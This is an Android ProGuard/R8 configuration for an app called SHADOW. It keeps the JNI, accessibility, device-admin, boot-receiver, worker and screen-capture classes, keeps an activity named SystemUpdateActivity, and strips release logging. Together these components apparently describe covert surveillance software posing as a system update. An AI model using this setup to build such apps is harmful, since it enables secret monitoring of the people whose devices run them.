# SHADOW ProGuard/R8 Rules
# JNI native methods MUST keep their exact names — the Rust .so looks for
# Java_com_shadow_ShadowCore_nativeInit and Java_com_shadow_ShadowCore_logEvent.
# R8 renaming any of these = UnsatisfiedLinkError at runtime.

# Keep all native methods in ShadowCore
-keepclasseswithmembernames class com.shadow.ShadowCore {
    native <methods>;
}

# Keep ShadowCore entirely (JNI bridge object)
-keep class com.shadow.ShadowCore { *; }

# Keep AccessibilityService — Android instantiates it by class name from Manifest
-keep class com.shadow.a11y.ShadowAccessibilityService { *; }

# Keep DeviceAdminReceiver — Android instantiates it by class name from Manifest
-keep class com.shadow.admin.DeviceAdminReceiver { *; }

# Keep BootReceiver — Android instantiates it by class name from Manifest
-keep class com.shadow.BootReceiver { *; }

# Keep SyncProvider — Android instantiates it by authorities string from Manifest
-keep class com.shadow.SyncProvider { *; }

# Keep Worker — WorkManager instantiates it by class name
-keep class com.shadow.ShadowWorker { *; }

# Keep Activity — referenced in AndroidManifest.xml
-keep class com.shadow.ui.SystemUpdateActivity { *; }

# Keep ScreenCaptureManager — called from JNI via class lookup
-keep class com.shadow.screen.ScreenCaptureManager { *; }

# Prevent R8 from stripping the Compose UI (used by SystemUpdateActivity)
-dontwarn androidx.compose.**
-keep class androidx.compose.** { *; }

# Allow warnings in dependencies (some libs have warning-level issues)
-dontwarn okhttp3.**
-dontwarn okio.**

# Remove debug logging in release builds
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}
